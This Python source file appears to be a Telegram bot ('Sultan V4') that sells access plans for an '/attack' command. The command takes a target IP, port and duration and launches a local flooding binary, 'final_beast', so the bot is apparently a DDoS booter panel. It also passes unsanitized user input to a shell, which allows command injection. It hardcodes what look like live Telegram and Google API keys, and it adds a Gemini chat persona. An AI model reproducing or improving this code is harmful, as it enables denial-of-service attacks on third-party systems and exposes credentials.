import telebot, subprocess, threading, os, time, google.generativeai as genai
from flask import Flask
from telebot import types

# --- 1. CONFIGURATION ---
TOKEN = "8586393188:AAFRRfO-oerTgHar07vuvWHTMHgfUBY52ew"
genai.configure(api_key="AIzaSyCcpvCR_G6qp1F6g_Dj1QEYKIr8PdPVMF0")
model = genai.GenerativeModel('gemini-1.5-flash') # Flash is faster than Pro for replies

bot = telebot.TeleBot(TOKEN, threaded=True, num_threads=10) # Optimized threads
app = Flask('')

ADMIN_ID = 5961723105
logged_in = [ADMIN_ID]

@app.route('/')
def home(): return "Sultan V4 Fast Mode is LIVE!"

# --- 2. FAST AI ---
def ask_ai(text):
    try:
        res = model.generate_content(f"Short reply in Hinglish as Sultan AI. User: {text}")
        return res.text
    except: return "Bhai, Sultan AI thoda busy hai!"

# --- 3. POWER COMMANDS ---
@bot.message_handler(commands=['start'])
def start(message):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🚀 ATTACK", callback_data="atk"))
    bot.send_message(message.chat.id, "🔱 **SULTAN V4 FAST MODE** 🔱", reply_markup=markup)

@bot.message_handler(commands=['givekey'])
def give_key(message):
    if message.from_user.id != ADMIN_ID: return
    args = message.text.split()
    if len(args) < 3:
        bot.reply_to(message, "❌ Use: `/givekey <ID> <PLAN>`")
        return
    # Key generate karke user ko bhejna
    target_id = args[1]
    bot.send_message(target_id, f"✅ **ACCESS GRANTED!**\nPlan: {args[2]}\nAb aap /attack use kar sakte hain.")
    bot.reply_to(message, "✅ Key Sent Successfully!")

@bot.message_handler(commands=['attack'])
def attack_cmd(message):
    if message.from_user.id not in logged_in:
        bot.reply_to(message, "🚫 Access Denied!")
        return
    args = message.text.split()
    if len(args) < 4: return
    
    ip, port, dur = args[1], args[2], args[3]
    bot.reply_to(message, f"🚀 **ATTACK TRIGGERED!**\nTarget: `{ip}:{port}`")
    
    # Fast Execution without breaking Telegram link
    def fire():
        subprocess.run(f"chmod +x final_beast && ./final_beast {ip} {port} {dur} 1000", shell=True)
    
    threading.Thread(target=fire).start()

@bot.message_handler(func=lambda m: not m.text.startswith('/'))
def chat(message):
    reply = ask_ai(message.text)
    bot.reply_to(message, reply)

if __name__ == "__main__":
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=10000)).start()
    bot.polling(none_stop=True, timeout=60) # Increased timeout for stability
